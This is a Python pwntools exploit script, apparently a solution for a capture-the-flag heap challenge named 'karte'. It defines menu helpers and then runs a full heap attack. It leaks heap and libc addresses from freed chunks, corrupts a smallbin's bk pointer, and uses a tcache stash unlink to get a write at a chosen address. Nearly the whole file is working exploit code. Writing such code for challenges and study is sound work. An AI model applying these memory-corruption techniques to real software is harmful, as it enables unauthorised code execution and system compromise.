from pwn import *
import re


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def alloc(id_, size):
    io.recvuntil(b'c\n---------------\n')
    io.sendlineafter("> ", "0")
    io.sendlineafter("> ", str(id_))
    io.sendlineafter("> ", str(size))
    io.recvuntil(b'---------------\n')

@debug
def extend(id_, size):
    io.recvuntil(b'c\n---------------\n')
    io.sendlineafter("> ", "1")
    io.sendlineafter("> ", str(id_))
    io.sendlineafter("> ", str(size))
    io.recvuntil(b'---------------\n')

@debug
def change_id(old, new):
    io.recvuntil(b'c\n---------------\n')
    io.sendlineafter("> ", "2")
    io.sendlineafter("> ", str(old))
    io.sendlineafter("> ", str(new))
    io.recvuntil(b'---------------\n')

@debug
def show(id_):
    io.recvuntil(b'c\n---------------\n')
    io.sendlineafter("> ", "3")
    io.sendlineafter("> ", str(id_))
    t = io.recvline()
    m = re.match(b"id: (.*) size: (.*)", t)
    io.recvuntil(b'---------------\n')
    return int(m.group(1), 16), int(m.group(2), 16)

@debug
def dealloc(id_):
    io.recvuntil(b'c\n---------------\n')
    io.sendlineafter("> ", "4")
    io.sendlineafter("> ", str(id_))
    io.recvuntil(b'---------------\n')


binpath = './karte'
elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = 'DEBUG'

gdbscript = '''
gef
b *0x4018F2
ignore 1 19+22
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)

victim = 0x404171 - 0x10
name = b'\x00' * 0x19 + p64(victim + 0x10)[:6]
io.sendlineafter(b'name > ', name)

for i in range(9):
    alloc(i, 0x58)
for i in range(7):
    dealloc(i)
dealloc(7)
dealloc(8)  # fastbins won't overwrite bk, so id will remain safe
addr_heap = show(8)[1] - 0x530
print('heap_base = 0x{:x}'.format(addr_heap))

for i in range(10, 17):
    alloc(i, 0x88)
alloc(20, 0x68)  # prevent consolidation
alloc(17, 0x88)
alloc(21, 0x68)  # prevent consolidation
alloc(18, 0x88)
alloc(22, 0x68)  # prevent consolidation
for i in range(10, 17):
    dealloc(i)
dealloc(17)
dealloc(18)

unsorted_bin_id = addr_heap + 0xb50
addr_libc = show(unsorted_bin_id)[1] - 0x1ebbe0
print('addr_libc = 0x{:x}'.format(addr_libc))

alloc(19, 0xa0)  # move unsortedbins to smallbins

# overwrite smallbins[0x90]->bk
small_bin_id = addr_libc + 0x1ebc60
# small_bin_id = addr_libc + 0x1edc60
change_id(small_bin_id, victim)

# empty tcache
for i in range(23, 23+7):
    alloc(i, 0x88)

print("Stash smallbins to tcache")
# stash smallbins to tcache
alloc(30, 0x88)


io.interactive()
